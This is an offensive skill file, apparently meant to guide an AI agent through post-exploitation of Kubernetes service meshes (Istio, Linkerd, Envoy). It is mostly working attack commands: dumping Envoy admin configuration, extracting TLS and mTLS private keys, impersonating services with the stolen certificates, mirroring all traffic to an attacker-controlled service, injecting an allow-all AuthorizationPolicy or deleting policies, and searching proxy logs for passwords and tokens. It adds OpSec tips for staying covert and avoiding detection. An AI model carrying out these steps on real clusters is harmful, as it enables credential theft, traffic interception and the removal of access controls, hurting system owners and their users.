---
name: servicemesh-tactics
description: "Service Mesh attack methodology (Istio/Linkerd/Envoy). Use when the target Kubernetes cluster runs a Service Mesh, when the istio-system/linkerd namespaces are found, when Envoy sidecar injection is present, or when the service mesh is needed for lateral movement. Covers Istio configuration theft, Gateway attacks, sidecar injection abuse, Envoy Admin interface abuse, service-to-service lateral movement, Linkerd attacks, TLS certificate theft, AuthorizationPolicy bypass, and telemetry log abuse."
zh-signals: "针对 Istio/Linkerd/Envoy 服务网格的攻击方法，覆盖配置窃取、Gateway 攻击与横向移动。信号:服务网格,Istio,Linkerd,Envoy,Sidecar横向移动"
when-to-use: "Use when a Kubernetes cluster runs a service mesh (istio-system or linkerd namespaces, Envoy sidecars) and you need to abuse mesh configuration, Envoy admin interfaces, or service-to-service traffic for lateral movement."
metadata:
  tags: "service-mesh,istio,linkerd,envoy,sidecar,gateway,virtualservice,destinationrule,authorization-policy,lateral-movement"
  category: "postexploit"
---

# Service Mesh Attack Methodology (Istio/Linkerd/Envoy)

A Service Mesh pushes network communication logic down into sidecar proxies (Envoy/Linkerd-proxy) and centrally manages traffic routing, mTLS, and access policy through the control plane (Istiod/Linkerd Control Plane). From the attacker's perspective: the control plane is the "brain" of the whole mesh, and obtaining control plane configuration means mastering the topology of every microservice; the sidecar Admin interface listens on localhost by default and is reachable from inside the pod; CRDs such as VirtualService/DestinationRule control where traffic flows, so anyone with RBAC permissions can hijack or tamper with routing.

## Further Reading

Complete attack commands, the Envoy Admin API endpoint list, the TLS certificate extraction flow, and AuthorizationPolicy bypass templates:

→ Read [references/attack-techniques.md](references/attack-techniques.md)

## Phase 1: Environment Identification

Confirm the Service Mesh type, version, and deployment scope to judge the size of the attack surface.

| Detection Target | Command | Confirmation Signal |
|---|---|---|
| Istio deployment | `kubectl get ns istio-system` | Namespace exists |
| Istio components | `kubectl get pods -n istio-system` | istiod, istio-ingressgateway |
| Linkerd deployment | `kubectl get ns linkerd` | Namespace exists |
| Linkerd components | `kubectl get pods -n linkerd` | linkerd-destination, linkerd-proxy-injector |
| Sidecar injection labels | `kubectl get ns --show-labels \| grep injection` | `istio-injection=enabled` |
| Sidecar inside the pod | `kubectl get pod POD -o jsonpath='{.spec.containers[*].name}'` | Contains `istio-proxy` or `linkerd-proxy` |
| Istio version | `kubectl get deploy istiod -n istio-system -o jsonpath='{.spec.template.spec.containers[0].image}'` | The version determines which known vulnerabilities apply |

**Quick determination inside a pod (no kubectl):**

```bash
# Check processes
ps aux 2>/dev/null | grep -E 'envoy|pilot-agent|linkerd'

# Check whether the Envoy Admin interface is reachable
curl -s http://localhost:15000/server_info 2>/dev/null | head -5

# Check whether the Linkerd Admin interface is reachable
curl -s http://localhost:4191/metrics 2>/dev/null | head -5

# Check the Istio certificate directory
ls -la /etc/certs/ /var/run/secrets/istio/ 2>/dev/null
```

## Phase 2: Attack Decision Tree

```
Service Mesh environment found
├── Inside a pod (sidecar present)
│   ├── Envoy Admin reachable (localhost:15000)
│   │   ├── → Phase 3: config dump / Cluster enumeration / Listener enumeration
│   │   └── → Phase 3: obtain the full mesh topology via /config_dump
│   ├── Access other services through the sidecar proxy
│   │   └── → Phase 5: Service-to-Service lateral movement
│   └── /etc/certs/ or /var/run/secrets/istio/ exists
│       └── → Phase 6: export TLS certificates → man-in-the-middle / identity spoofing
│
├── K8s RBAC permissions available (kubectl usable)
│   ├── Can read VirtualService / DestinationRule
│   │   └── → Phase 4: traffic routing theft / service topology mapping
│   ├── Can write VirtualService / DestinationRule
│   │   └── → Phase 4: traffic hijacking (mirror to an attacker-controlled service / modify route weights)
│   ├── Can read Gateway
│   │   └── → Phase 4: TLS certificate Secret extraction
│   ├── Can read/write AuthorizationPolicy
│   │   └── → Phase 7: policy bypass / policy deletion / allow-all injection
│   └── Can read ServiceEntry
│       └── → Phase 4: external service mapping (egress traffic analysis)
│
├── Istio control plane (istio-system)
│   ├── Istiod reachable → xDS API enumeration
│   ├── IngressGateway exposed → ingress attack surface
│   └── → Phase 4: full enumeration of the istio-system configuration
│
└── Linkerd control plane (linkerd)
    ├── linkerd-destination reachable
    ├── ServiceProfile enumeration
    └── → Phase 8: Linkerd-specific attacks
```

## Phase 3: Envoy Admin Interface Abuse

The Envoy Admin interface listens on `localhost:15000` (Istio) or `localhost:15001` by default and is reachable from inside the pod without authentication. This is the fastest information-gathering path in a Service Mesh attack.

**Key endpoints:**

| Endpoint | Purpose | Attack Value |
|---|---|---|
| `/clusters` | Upstream cluster list | Addresses and ports of every reachable microservice |
| `/config_dump` | Complete Envoy configuration | Route rules, TLS configuration, full mesh topology |
| `/listeners` | Listener list | Inbound/outbound ports and filter chains |
| `/server_info` | Envoy version | The version maps to known vulnerabilities |
| `/stats` | Statistics | Traffic patterns, active connections |
| `/certs` | TLS certificate information | Certificate SANs, validity period, CA chain |
| `/ready` | Readiness state | Confirms Envoy is running normally |

```bash
# Core enumeration (run inside the pod)
curl -s http://localhost:15000/clusters | grep -E "^[a-z]" | head -30
curl -s http://localhost:15000/config_dump > /tmp/envoy_config.json
curl -s http://localhost:15000/listeners
curl -s http://localhost:15000/server_info
curl -s http://localhost:15000/certs
```

**Extract key information from config_dump:**

```bash
# Extract all upstream service addresses
cat /tmp/envoy_config.json | python3 -c "
import sys,json
d=json.load(sys.stdin)
for c in d.get('configs',[]):
  if 'dynamic_active_clusters' in c:
    for cl in c['dynamic_active_clusters']:
      name=cl.get('cluster',{}).get('name','')
      if name: print(name)
" 2>/dev/null

# Simplified version: extract service names with grep
grep -oP '"name":\s*"[^"]*svc\.cluster\.local[^"]*"' /tmp/envoy_config.json | sort -u
```

→ Read [references/attack-techniques.md](references/attack-techniques.md) for the complete Envoy Admin API abuse commands

## Phase 4: Istio Configuration Enumeration and Manipulation

Use the Istio CRDs to understand the traffic routing and service topology of the whole mesh, and hijack traffic when write access is available.

### 4.1 Configuration Theft (Read-Only)

```bash
# VirtualService — routing rules (which URLs route to which services)
kubectl get virtualservices --all-namespaces -o yaml

# DestinationRule — load balancing policy, mTLS configuration
kubectl get destinationrules --all-namespaces -o yaml

# Gateway — ingress configuration, TLS certificate references
kubectl get gateways --all-namespaces -o yaml

# ServiceEntry — external service allowlist
kubectl get serviceentries --all-namespaces -o yaml

# AuthorizationPolicy — access control policy
kubectl get authorizationpolicies --all-namespaces -o yaml

# PeerAuthentication — mTLS mode (STRICT/PERMISSIVE/DISABLE)
kubectl get peerauthentication --all-namespaces -o yaml
```

### 4.2 Gateway TLS Certificate Extraction

```bash
# Find the Secret referenced by the Gateway
kubectl get gateway -A -o yaml | grep -A 3 "credentialName"

# Extract the certificate and private key
kubectl get secret CERT_SECRET -n istio-system -o jsonpath='{.data.tls\.crt}' | base64 -d > /tmp/mesh-cert.pem
kubectl get secret CERT_SECRET -n istio-system -o jsonpath='{.data.tls\.key}' | base64 -d > /tmp/mesh-key.pem
openssl x509 -in /tmp/mesh-cert.pem -text -noout
```

### 4.3 Traffic Hijacking (Requires Write Access)

```bash
# Mirror traffic to an attacker-controlled service (does not affect normal traffic, covert theft)
cat <<'EOF' | kubectl apply -f -
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: mirror-attack
  namespace: TARGET_NS
spec:
  hosts:
  - target-service
  http:
  - route:
    - destination:
        host: target-service
    mirror:
      host: attacker-service
    mirrorPercentage:
      value: 100.0
EOF
```

→ Read [references/attack-techniques.md](references/attack-techniques.md) for traffic weight tampering and route hijacking templates

## Phase 5: Service-to-Service Lateral Movement

Access other microservices in the mesh from inside a pod, through the sidecar proxy (or bypassing the sidecar).

```bash
# List all reachable services (from Envoy clusters)
curl -s http://localhost:15000/clusters | grep -oP '[\w.-]+\.[\w.-]+\.svc\.cluster\.local' | sort -u

# Access the target service through the sidecar proxy
curl -s http://target-service.target-ns.svc.cluster.local:8080/api/endpoint

# Internal port probing
for svc in $(curl -s http://localhost:15000/clusters | grep -oP '[\w.-]+\.[\w.-]+\.svc\.cluster\.local' | sort -u); do
  echo "=== $svc ==="
  curl -s -o /dev/null -w "%{http_code}" "http://$svc/" --connect-timeout 2
done

# Try to reach control plane components
curl -s http://istiod.istio-system.svc.cluster.local:15014/debug/endpointz
curl -s http://istiod.istio-system.svc.cluster.local:15014/debug/configz
```

## Phase 6: TLS Certificate Theft and Identity Spoofing

A Service Mesh uses mTLS for service-to-service authentication. Stealing certificates allows impersonating a service identity or performing a man-in-the-middle attack.

```bash
# Istio certificate locations (inside the pod)
ls -la /etc/certs/                          # Legacy Istio
ls -la /var/run/secrets/istio/              # Newer Istio (SDS)

# Extract the certificate chain and private key
cat /var/run/secrets/istio/root-cert.pem    # CA root certificate
cat /var/run/secrets/istio/cert-chain.pem   # Service certificate chain
cat /var/run/secrets/istio/key.pem          # Service private key

# Analyze the certificate (extract the SPIFFE ID / service identity)
openssl x509 -in /var/run/secrets/istio/cert-chain.pem -text -noout | grep -A 1 "Subject Alternative Name"
# Typical output: URI:spiffe://cluster.local/ns/NAMESPACE/sa/SERVICE_ACCOUNT

# Use the stolen certificate to access other services (bypassing mTLS authentication)
curl --cert /var/run/secrets/istio/cert-chain.pem \
     --key /var/run/secrets/istio/key.pem \
     --cacert /var/run/secrets/istio/root-cert.pem \
     https://target-service:PORT/
```

→ Read [references/attack-techniques.md](references/attack-techniques.md) for the complete certificate abuse and identity spoofing commands

## Phase 7: AuthorizationPolicy Bypass

Istio's AuthorizationPolicy controls access permissions between services. The goal is to weaken or eliminate these restrictions.

```bash
# Enumerate all policies
kubectl get authorizationpolicies --all-namespaces -o yaml

# Find permissive policies (unconditional ALLOW)
kubectl get authorizationpolicies -A -o yaml | grep -B 5 -A 10 "action: ALLOW"

# Find PeerAuthentication in PERMISSIVE mode (mTLS not enforced)
kubectl get peerauthentication -A -o yaml | grep -B 5 "mode: PERMISSIVE"
```

**With write access — inject an allow-all policy:**

```yaml
# Allow all traffic in the namespace (empty spec = allow all)
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: allow-all
  namespace: TARGET_NAMESPACE
spec: {}
```

**With delete access — remove the policy directly:**

```bash
kubectl delete authorizationpolicy POLICY_NAME -n TARGET_NAMESPACE
```

## Phase 8: Linkerd-Specific Attacks

```bash
# Enumerate the Linkerd configuration
kubectl get configmap -n linkerd -o yaml
kubectl get serviceprofiles --all-namespaces -o yaml

# Linkerd Proxy Admin (inside the pod)
curl -s http://localhost:4191/metrics
curl -s http://localhost:4191/ready

# Linkerd Dashboard (if exposed)
kubectl port-forward -n linkerd deploy/linkerd-web 8084:8084
# Visit http://localhost:8084 to view the full mesh topology and traffic

# Linkerd certificate extraction
kubectl get secret -n linkerd | grep -i "tls\|cert\|ca"
kubectl get secret linkerd-identity-issuer -n linkerd -o yaml
```

## Phase 9: Telemetry and Log Abuse

The telemetry components of a Service Mesh (Prometheus, Jaeger, Kiali) may expose sensitive traffic data.

```bash
# View Istio access logs (may contain sensitive information such as request headers and paths)
kubectl logs -n istio-system deployment/istio-ingressgateway | head -50
kubectl logs -n TARGET_NS POD_NAME -c istio-proxy | grep -iE "password|secret|token|auth"

# Prometheus (if reachable)
curl -s "http://prometheus.istio-system:9090/api/v1/targets" | head
curl -s "http://prometheus.istio-system:9090/api/v1/query?query=istio_requests_total"

# Kiali (service mesh visualization)
kubectl port-forward -n istio-system deploy/kiali 20001:20001
# Visit http://localhost:20001 to view the full mesh topology, traffic, and configuration

# Jaeger (distributed tracing)
kubectl port-forward -n istio-system deploy/jaeger 16686:16686
# Visit http://localhost:16686 to view request trace chains
```

## Tool Quick Reference

| Tool | Purpose | Key Commands |
|---|---|---|
| `kubectl` | K8s resource operations | `kubectl get virtualservices -A` |
| `istioctl` | Istio-specific CLI | `istioctl analyze`, `istioctl proxy-config` |
| `curl` | Envoy Admin interface | `curl http://localhost:15000/clusters` |
| `openssl` | Certificate analysis | `openssl x509 -in cert.pem -text -noout` |
| `linkerd` | Linkerd CLI | `linkerd check`, `linkerd viz dashboard` |
| `tcpdump` | Traffic capture (inside a pod) | `tcpdump -i any -w /tmp/mesh.pcap` |

## Notes

**OpSec:**
- Modifying a VirtualService/DestinationRule immediately affects production traffic, so always record the original configuration before operating
- Deleting an AuthorizationPolicy exposes the service and increases the risk of detection by the security team
- Accessing the Envoy Admin interface produces no Istio audit log, but kubectl operations are recorded in the K8s Audit Log
- Traffic mirroring is the most covert theft method because it does not affect normal request/response handling

**mTLS-related:**
- If PeerAuthentication is in STRICT mode, traffic originating outside the mesh is rejected
- PERMISSIVE mode allows a mix of plaintext and mTLS — services can be accessed directly over plaintext
- Stolen certificates usually have a short validity period (24 hours by default in Istio), so new certificates must be obtained continuously

**Linkerd vs Istio:**
- Linkerd's Proxy Admin listens on port 4191 by default and provides fewer features than the Envoy Admin interface
- Linkerd has no CRDs such as VirtualService/DestinationRule; it uses ServiceProfile and TrafficSplit instead
- Linkerd's identity certificates also have a short default validity period
